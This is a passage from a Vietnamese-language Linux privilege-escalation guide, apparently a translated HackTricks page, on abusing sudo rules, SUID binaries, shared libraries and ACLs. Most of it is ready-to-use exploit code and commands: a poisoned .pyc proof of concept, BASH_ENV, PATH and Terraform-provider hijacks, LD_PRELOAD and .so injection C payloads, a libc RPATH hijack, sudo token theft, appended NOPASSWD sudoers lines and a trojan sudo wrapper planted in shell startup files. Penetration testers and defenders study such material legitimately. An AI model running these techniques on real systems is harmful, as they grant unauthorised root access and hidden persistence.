  - Nếu bạn có thể **xóa rồi tạo lại** file cache vì thư mục có quyền ghi, bạn vẫn có thể thay thế một file `.pyc` thuộc sở hữu của root nhưng không có quyền ghi.
- Đường dẫn thường gặp:
  - `sudo -l` cho thấy một script hoặc wrapper Python mà bạn có thể chạy với quyền root.
  - Script đó import một module cục bộ từ `/opt/app/`, `/usr/local/lib/...`, v.v.
  - Thư mục `__pycache__` của module được import có quyền ghi bởi user của bạn hoặc mọi người.

Liệt kê nhanh:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Nếu bạn có thể kiểm tra script có đặc quyền, hãy xác định các module được import và đường dẫn cache của chúng:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Quy trình khai thác:

1. Chạy script được phép dùng sudo một lần để Python tạo file cache hợp lệ nếu file đó chưa tồn tại.
2. Đọc 16 byte đầu tiên từ file `.pyc` hợp lệ và dùng lại chúng trong file bị đầu độc.
3. Biên dịch một code object chứa payload, dùng `marshal.dumps(...)` để tuần tự hóa nó, xóa file cache gốc rồi tạo lại file với header gốc cùng bytecode độc hại của bạn.
4. Chạy lại script được phép dùng sudo để lệnh import thực thi payload của bạn với quyền root.

Lưu ý quan trọng:

- Dùng lại header gốc là yếu tố then chốt vì Python kiểm tra metadata của cache đối chiếu với file nguồn, chứ không kiểm tra xem phần thân bytecode có thực sự khớp với file nguồn hay không.
- Cách này đặc biệt hữu ích khi file nguồn thuộc sở hữu của root và không thể ghi, nhưng thư mục `__pycache__` chứa file đó thì có thể ghi.
- `PYTHONDONTWRITEBYTECODE=1` và `python -B` ngăn Python ghi file `.pyc` mới; chúng **không** ngăn Python tải một cache hợp lệ sẵn có đã bị kẻ tấn công thay thế. Ranh giới bảo mật then chốt là liệu người dùng có đặc quyền thấp hơn có thể thay thế cache mà lệnh import có đặc quyền chấp nhận hay không. Python kiểm tra metadata thời gian/kích thước hoặc hash trước khi tải bytecode đã cache. Xem [tài liệu tham khảo về import của Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) và [tài liệu về dòng lệnh](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Dạng proof-of-concept tối giản:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening:

- Đảm bảo không có thư mục nào trong đường dẫn import Python có đặc quyền cho phép người dùng ít đặc quyền ghi, bao gồm cả `__pycache__`.
- Kiểm tra chủ sở hữu và quyền của thư mục cache, bao gồm cả các tệp `.pyc` hiện có. Tắt ghi bytecode có thể giảm việc tạo cache mới, nhưng không vô hiệu hóa cache hiện có có thể bị thay thế.
- Xử lý các module Python cục bộ có thể ghi và thư mục cache có thể ghi tương tự như cách bạn xử lý các shell script hoặc thư viện dùng chung có thể ghi được thực thi bởi root.

### BASH_ENV được giữ lại qua sudo env_keep → shell root

Nếu sudoers giữ lại `BASH_ENV` (ví dụ: `Defaults env_keep+="ENV BASH_ENV"`), bạn có thể tận dụng hành vi khởi động của Bash không tương tác để chạy mã tùy ý với quyền root khi gọi một lệnh được cho phép.<sup>[[24]](#references)</sup>

- Vì sao hoạt động: Với shell không tương tác, Bash đánh giá `$BASH_ENV` và nạp tệp đó trước khi chạy script đích. Nhiều quy tắc sudo cho phép chạy một script hoặc shell wrapper. Nếu `BASH_ENV` được sudo giữ lại, tệp của bạn sẽ được nạp với quyền root.<sup>[[23]](#references)</sup>

- Yêu cầu:
  - Một quy tắc sudo mà bạn có thể chạy (bất kỳ mục tiêu nào gọi `/bin/bash` ở chế độ không tương tác hoặc bất kỳ bash script nào).
  - `BASH_ENV` có trong `env_keep` (kiểm tra bằng `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Tăng cường bảo mật:
  - Xóa `BASH_ENV` (và `ENV`) khỏi `env_keep`, ưu tiên `env_reset`.
  - Tránh dùng shell wrapper cho các lệnh được phép chạy bằng sudo; dùng binary tối giản.
  - Cân nhắc ghi nhật ký I/O của sudo và cảnh báo khi các biến môi trường được giữ lại được sử dụng.

### Terraform qua sudo với `HOME` được giữ lại (!env_reset)

Khi sudo cho phép chạy Terraform với tư cách người dùng có nhiều đặc quyền hơn, `!env_reset` là dấu hiệu để kiểm tra những biến môi trường nào thực sự được giữ lại theo quy tắc cụ thể đó. Hãy xác nhận `HOME` hoặc `TF_CLI_CONFIG_FILE` hiệu lực trước khi xem `.terraformrc` hoặc `terraform.rc` mà người gọi có quyền ghi là cấu hình CLI đang được sử dụng. Một mục `provider_installation.dev_overrides` chỉ có tác dụng nếu lệnh Terraform cố định tải provider đó và người gọi có thể đặt tệp thực thi của nó trong thư mục đã chọn.<sup>[[25]](#references)</sup>

- Trỏ provider cần thiết đến một thư mục có quyền ghi và đặt một plugin độc hại mang tên provider đó (ví dụ: `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform sẽ thất bại ở bước bắt tay Go plugin nhưng thực thi payload với quyền root trước khi thoát, để lại một shell SUID.

### Ghi đè TF_VAR + bypass xác thực symlink

Có thể cung cấp biến Terraform thông qua các biến môi trường `TF_VAR_<name>` nếu quy tắc sudo cụ thể giữ lại chúng. Để **đọc** qua symlink nguồn, provider cũng cần đi theo liên kết và sao chép kết quả được bảo vệ đến một đích mà người gọi có thể đọc. Riêng việc **ghi** qua symlink đích cần một mục đích đến do người gọi kiểm soát và một provider đặc quyền đi theo liên kết khi ghi; một job được lên lịch sau đó chỉ là một trong những hậu quả có thể xảy ra. Trước khi thử một trong hai cách, hãy kiểm tra chính xác quyền sudo được cấp, các tệp `.tf` liên quan, cấu hình CLI được chọn và quyền sở hữu đường dẫn bằng các lệnh chỉ đọc như `sudo -l`, `stat` và `readlink`. Các bước xác thực yếu dựa trên chuỗi như `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` không phân giải symlink:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform phân giải symlink và sao chép `/root/root.txt` thật vào một vị trí đích mà attacker có thể đọc. Có thể dùng cách tương tự để **ghi** vào các đường dẫn đặc quyền bằng cách tạo trước symlink tại vị trí đích (ví dụ: trỏ đường dẫn đích của provider vào bên trong `/etc/cron.d/`).

### requiretty / !requiretty

Trên một số bản phân phối cũ, sudo có thể được cấu hình với `requiretty`, buộc sudo chỉ chạy từ một TTY tương tác. Nếu đặt `!requiretty` (hoặc không có tùy chọn này), sudo có thể được thực thi từ các ngữ cảnh không tương tác như reverse shell, cron job hoặc script.

```bash
Defaults !requiretty
```

Đây không phải là một lỗ hổng trực tiếp, nhưng nó mở rộng các tình huống có thể lạm dụng quy tắc sudo mà không cần PTY đầy đủ.

### Sudo env_keep+=PATH / secure_path không an toàn → PATH hijack

Nếu `sudo -l` hiển thị `env_keep+=PATH` hoặc `secure_path` chứa các mục mà attacker có thể ghi (ví dụ: `/home/<user>/bin`), một lệnh bên ngoài không được chỉ định đường dẫn đầy đủ bên trong mục tiêu được sudo cho phép có thể bị ghi đè.<sup>[[3]](#references)</sup> Cũng cần xem xét trường hợp không có `secure_path` hiệu lực **nếu** môi trường sudo của lệnh giữ lại `PATH` do người gọi kiểm soát; chỉ riêng việc thiếu `secure_path` không chứng minh điều đó. Đọc script được cho phép mà không chạy nó, sau đó xác minh chính xác quy tắc RunAs và đối số, đường dẫn tìm kiếm lệnh hiệu lực, cùng một thư mục có thể ghi và truy cập được nằm ở vị trí ưu tiên hơn, chứa tên lệnh đó. Việc xác thực, `NOEXEC`, shell builtin và đường dẫn lệnh tuyệt đối có thể làm thay đổi kết quả.

- Yêu cầu: một quy tắc sudo (thường là `NOPASSWD`) chạy script/binary gọi các lệnh không dùng đường dẫn tuyệt đối (`free`, `df`, `ps`, v.v.) và có mục PATH có thể ghi được, được tìm kiếm trước.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Bỏ qua đường dẫn khi thực thi bằng Sudo
**Di chuyển** để đọc các tệp khác hoặc sử dụng **symlinks**. Ví dụ trong tệp sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Nếu dùng **wildcard** (\*), thì còn dễ hơn:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Biện pháp đối phó**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Lệnh Sudo/tệp nhị phân SUID không có đường dẫn lệnh

Nếu **quyền sudo** được cấp cho một lệnh duy nhất **mà không chỉ định đường dẫn**: _hacker10 ALL= (root) less_, bạn có thể khai thác bằng cách thay đổi biến PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Kỹ thuật này cũng có thể được sử dụng nếu một binary **suid** **thực thi lệnh khác mà không chỉ định đường dẫn đến lệnh đó (luôn kiểm tra nội dung của một binary SUID lạ bằng** _**strings**_**)**.

[Ví dụ payload để thực thi.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binary SUID có đường dẫn lệnh

Nếu binary **suid** **thực thi lệnh khác bằng cách chỉ định đường dẫn**, bạn có thể thử **export một function** có tên trùng với lệnh mà file suid gọi.

Ví dụ: nếu một binary suid gọi _**/usr/sbin/service apache2 start**_, bạn cần thử tạo và export function đó:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Sau đó, khi bạn gọi binary SUID, hàm này sẽ được thực thi

### Wrapper copy SUID tùy chỉnh

Một tiện ích SUID thuộc sở hữu của root, chấp nhận đường dẫn nguồn và đích, có thể vượt qua hai ranh giới tin cậy khác nhau. Nếu nó tạo lệnh shell từ một trong hai tham số (ví dụ: truyền lệnh `cp` được tạo sẵn cho `system()`), các ký tự đặc biệt của shell có thể thực thi lệnh khác với các quyền hiệu lực của binary. Ngay cả khi gọi `cp` an toàn, không thông qua shell, việc không giới hạn đường dẫn đích có thể cho phép ghi tùy ý vào các file đặc quyền như `/etc/passwd`. Hãy kiểm tra cách wrapper xử lý tham số, hành vi của effective UID, các giới hạn đối với đường dẫn đích và liệu file được sao chép có giữ nội dung do người gọi kiểm soát hay không; chỉ riêng lỗi chung của `cp` hoặc bit SUID không chứng minh được khả năng khai thác theo cách nào. Trước khi kiểm thử thủ công, hãy liệt kê binary và quyền của nó theo cách thụ động.

### Script có thể ghi được được thực thi bởi wrapper SUID

Một cấu hình sai thường gặp trong ứng dụng tùy chỉnh là wrapper binary SUID thuộc sở hữu của root thực thi một script, trong khi người dùng có quyền thấp có thể ghi vào chính script đó.

Mẫu thường gặp:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Nếu `/usr/local/bin/backup.sh` có thể ghi, bạn có thể thêm các lệnh payload vào cuối rồi thực thi wrapper SUID:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Kiểm tra nhanh:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Đường tấn công này đặc biệt phổ biến trong các wrapper “maintenance”/“backup” được cài trong `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Biến môi trường **LD_PRELOAD** được dùng để chỉ định một hoặc nhiều thư viện dùng chung (tệp .so) mà loader sẽ tải trước tất cả các thư viện khác, bao gồm cả thư viện C chuẩn (`libc.so`). Quá trình này được gọi là preloading một thư viện.

Tuy nhiên, để duy trì tính bảo mật của hệ thống và ngăn tính năng này bị khai thác, đặc biệt là với các tệp thực thi **suid/sgid**, hệ thống áp dụng một số điều kiện:

- Loader bỏ qua **LD_PRELOAD** đối với các tệp thực thi có ID người dùng thực (_ruid_) không khớp với ID người dùng hiệu lực (_euid_).
- Đối với các tệp thực thi có suid/sgid, chỉ những thư viện nằm trong các đường dẫn chuẩn và cũng có suid/sgid mới được preload.

Có thể leo thang đặc quyền nếu bạn có khả năng chạy lệnh bằng `sudo` và đầu ra của `sudo -l` có chứa chỉ thị **env_keep+=LD_PRELOAD**. Cấu hình này cho phép biến môi trường **LD_PRELOAD** được giữ lại và nhận diện ngay cả khi chạy lệnh bằng `sudo`, từ đó có khả năng dẫn đến việc thực thi mã tùy ý với đặc quyền cao hơn.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Lưu dưới tên **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Sau đó **biên dịch nó** bằng cách:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Cuối cùng, **leo thang đặc quyền** bằng cách chạy

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Có thể lợi dụng một kiểu privesc tương tự nếu attacker kiểm soát biến môi trường **LD_LIBRARY_PATH**, vì họ kiểm soát đường dẫn dùng để tìm kiếm các thư viện.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

Khi gặp một binary có quyền **SUID** trông bất thường, bạn nên kiểm tra xem nó có tải các file **.so** đúng cách hay không. Có thể kiểm tra bằng cách chạy lệnh sau:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Chẳng hạn, nếu gặp lỗi như _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_, điều đó cho thấy có khả năng khai thác.

Để khai thác điều này, hãy tạo một tệp C, chẳng hạn _"/path/to/.config/libcalc.c"_, chứa đoạn mã sau:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Đoạn code này, sau khi được biên dịch và thực thi, nhằm nâng cao quyền bằng cách thao tác với quyền truy cập tệp và thực thi shell với quyền cao hơn.

Biên dịch tệp C ở trên thành tệp shared object (.so) bằng lệnh:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Cuối cùng, chạy binary SUID bị ảnh hưởng sẽ kích hoạt exploit, có khả năng dẫn đến xâm phạm hệ thống.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Giờ chúng ta đã tìm thấy một binary SUID tải library từ thư mục mà chúng ta có quyền ghi, hãy tạo library trong thư mục đó với tên cần thiết:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Nếu bạn gặp lỗi như

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

điều đó có nghĩa là thư viện bạn đã tạo cần có một hàm tên là `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) là danh sách được tuyển chọn gồm các binary Unix mà kẻ tấn công có thể khai thác để vượt qua các hạn chế bảo mật cục bộ. [**GTFOArgs**](https://gtfoargs.github.io/) cũng tương tự, nhưng dành cho các trường hợp bạn **chỉ có thể chèn đối số** vào một lệnh.

Dự án tập hợp các chức năng hợp pháp của binary Unix có thể bị lạm dụng để thoát khỏi restricted shell, leo thang hoặc duy trì đặc quyền nâng cao, truyền tệp, tạo bind shell và reverse shell, cũng như hỗ trợ các tác vụ post-exploitation khác.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Nếu có thể truy cập `sudo -l`, bạn có thể dùng công cụ [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) để kiểm tra xem công cụ có tìm ra cách khai thác quy tắc sudo nào không.

### Tái sử dụng Sudo Tokens

Trong trường hợp bạn có **quyền truy cập sudo** nhưng không có mật khẩu, bạn có thể leo thang đặc quyền bằng cách **chờ một lệnh sudo được thực thi rồi chiếm quyền phiên token**.<sup>[[18]](#references)</sup>

Các yêu cầu để leo thang đặc quyền:

- Bạn đã có shell với tư cách người dùng "_sampleuser_"
- "_sampleuser_" đã **dùng `sudo`** để thực thi một lệnh nào đó trong **15 phút vừa qua** (mặc định, đó là thời hạn của sudo token, cho phép chúng ta dùng `sudo` mà không cần nhập mật khẩu)
- `cat /proc/sys/kernel/yama/ptrace_scope` trả về 0
- Có thể truy cập `gdb` (bạn có thể tải nó lên)

(Bạn có thể tạm thời bật `ptrace_scope` bằng lệnh `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` hoặc bật vĩnh viễn bằng cách chỉnh sửa `/etc/sysctl.d/10-ptrace.conf` và đặt `kernel.yama.ptrace_scope = 0`)

Nếu đáp ứng tất cả các yêu cầu này, **bạn có thể leo thang đặc quyền bằng cách dùng:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Exploit đầu tiên** (`exploit.sh`) sẽ tạo binary `activate_sudo_token` trong _/tmp_. Bạn có thể dùng nó để **kích hoạt sudo token trong phiên của mình** (bạn sẽ không tự động có được root shell; hãy chạy `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **Exploit thứ hai** (`exploit_v2.sh`) sẽ tạo một shell sh trong _/tmp_ **do root sở hữu với setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **Exploit thứ ba** (`exploit_v3.sh`) sẽ **tạo một tệp sudoers** khiến **sudo tokens tồn tại vĩnh viễn và cho phép tất cả người dùng sử dụng sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Nếu bạn có **quyền ghi** trong thư mục hoặc vào bất kỳ tệp nào được tạo bên trong thư mục, bạn có thể dùng binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) để **tạo sudo token cho một người dùng và PID**.\
Ví dụ: nếu bạn có thể ghi đè tệp _/var/run/sudo/ts/sampleuser_ và có shell với tư cách người dùng đó, với PID 1234, bạn có thể **lấy quyền sudo** mà không cần biết mật khẩu bằng cách thực hiện:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Tệp `/etc/sudoers` và các tệp bên trong `/etc/sudoers.d` cấu hình ai có thể dùng `sudo` và cách sử dụng. Theo mặc định, **chỉ người dùng root và nhóm root mới có thể đọc các tệp này**.\
**Nếu** bạn có thể **đọc** tệp này, bạn có thể **thu thập một số thông tin hữu ích**; nếu bạn có thể **ghi** vào bất kỳ tệp nào, bạn sẽ có thể **leo thang đặc quyền**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Nếu bạn có quyền ghi, bạn có thể lạm dụng quyền này.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Một cách khác để lạm dụng các quyền này:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Có một số lựa chọn thay thế cho binary `sudo`, chẳng hạn như `doas` trên OpenBSD. Hãy nhớ kiểm tra cấu hình tại `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Nếu `doas` cho phép dùng trình soạn thảo hoặc trình thông dịch, hãy kiểm tra các kỹ thuật escape kiểu GTFOBins:

```bash
doas vim
:!/bin/sh
```

Một quy tắc `doas` có quyền root cho `dstat` gốc viết bằng Python cũng cần được xem xét về đường dẫn plugin. [Tài liệu hướng dẫn](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) và [mã nguồn](https://github.com/dstat-real/dstat/blob/master/dstat) liệt kê `/usr/share/dstat/` và `/usr/local/share/dstat/` trong số các vị trí chứa plugin `dstat_*.py`. Nếu người dùng hiện tại có thể ghi vào và tìm kiếm trong một vị trí thực sự được bản build đã cài sử dụng, plugin được chọn có thể chạy với danh tính RunAs của `doas`. Hãy xác nhận quy tắc có hiệu lực, cách tra cứu plugin trong bản build đó, quyền hoặc ACL của thư mục và thư mục cha, cũng như liệu người gọi có thể chọn plugin hay không; chỉ riêng quy tắc `dstat` hoặc thư mục có thể ghi mới chỉ là manh mối. Các bản triển khai `dstat` khác có thể dùng hệ thống plugin khác. Kiểm tra metadata theo cách thụ động, không tải plugin.

### Sudo Hijacking

Nếu bạn biết **một người dùng thường kết nối đến máy và dùng `sudo`** để leo thang đặc quyền, đồng thời bạn có shell trong ngữ cảnh người dùng đó, bạn có thể **tạo một tệp thực thi sudo mới** để chạy mã của bạn với quyền root rồi chạy lệnh của người dùng. Sau đó, **sửa đổi $PATH** trong ngữ cảnh người dùng đó (ví dụ: thêm đường dẫn mới vào .bash_profile) để khi người dùng chạy sudo, tệp thực thi sudo của bạn sẽ được chạy.

Lưu ý rằng nếu người dùng dùng một shell khác (không phải bash), bạn sẽ cần sửa đổi các tệp khác để thêm đường dẫn mới. Ví dụ, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) sửa đổi `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Bạn có thể tìm một ví dụ khác trong [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Hoặc chạy thứ gì đó như:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Thư viện dùng chung

### ld.so

Tệp `/etc/ld.so.conf` cho biết **các tệp cấu hình được tải nằm ở đâu**. Thông thường, tệp này chứa đường dẫn sau: `include /etc/ld.so.conf.d/*.conf`

Điều đó có nghĩa là các tệp cấu hình trong `/etc/ld.so.conf.d/*.conf` sẽ được đọc. Các tệp cấu hình này **trỏ đến những thư mục khác** để **tìm kiếm** **thư viện**. Ví dụ: nội dung của `/etc/ld.so.conf.d/libc.conf` là `/usr/local/lib`. **Điều này có nghĩa là hệ thống sẽ tìm kiếm thư viện trong `/usr/local/lib`**.

Nếu vì lý do nào đó **người dùng có quyền ghi** vào bất kỳ đường dẫn nào sau đây: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bất kỳ tệp nào bên trong `/etc/ld.so.conf.d/` hoặc bất kỳ thư mục nào được chỉ định trong tệp cấu hình bên trong `/etc/ld.so.conf.d/*.conf`, thì người đó có thể leo thang đặc quyền.\
Hãy xem **cách khai thác cấu hình sai này** trên trang sau:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Bằng cách sao chép lib vào `/var/tmp/flag15/`, chương trình sẽ sử dụng lib tại vị trí này như được chỉ định trong biến `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Sau đó tạo một thư viện độc hại trong `/var/tmp` bằng lệnh `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities cung cấp **một tập hợp con các quyền root hiện có cho một tiến trình**. Điều này thực chất chia **các quyền root thành những đơn vị nhỏ hơn, riêng biệt**. Sau đó, từng đơn vị có thể được cấp độc lập cho các tiến trình. Nhờ vậy, toàn bộ tập hợp quyền được thu hẹp, giảm nguy cơ bị khai thác.\
Đọc trang sau để **tìm hiểu thêm về capabilities và cách lạm dụng chúng**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Quyền thư mục

Trong một thư mục, **bit "execute"** có nghĩa là người dùng chịu ảnh hưởng có thể "**cd**" vào thư mục đó.\
Bit **"read"** có nghĩa là người dùng có thể **liệt kê** các **tệp**, còn bit **"write"** có nghĩa là người dùng có thể **xóa** và **tạo** các **tệp** mới.

## ACLs

Access Control Lists (ACLs) là lớp quyền tùy ý thứ cấp, có thể **ghi đè các quyền ugo/rwx truyền thống**. Các quyền này tăng cường khả năng kiểm soát quyền truy cập vào tệp hoặc thư mục bằng cách cho phép hoặc từ chối quyền đối với những người dùng cụ thể không phải chủ sở hữu hoặc thành viên nhóm. Mức độ **chi tiết này đảm bảo việc quản lý quyền truy cập chính xác hơn**. Bạn có thể xem thêm chi tiết [**tại đây**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Cấp** cho người dùng "kali" quyền đọc và ghi đối với một tệp:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Lấy** các tệp có ACL cụ thể từ hệ thống:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Backdoor ACL ẩn trong các tệp drop-in của sudoers

Một cấu hình sai phổ biến là tệp thuộc sở hữu của root trong `/etc/sudoers.d/` có quyền `440` nhưng vẫn cấp quyền ghi cho người dùng có đặc quyền thấp thông qua ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Nếu bạn thấy dạng như `user:alice:rw-`, người dùng đó vẫn có thể thêm quy tắc sudo dù các bit quyền hạn chế:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Đây là đường dẫn persistence/privesc ACL có tác động cao vì rất dễ bị bỏ sót khi chỉ kiểm tra bằng `ls -l`.

## Các phiên shell đang mở

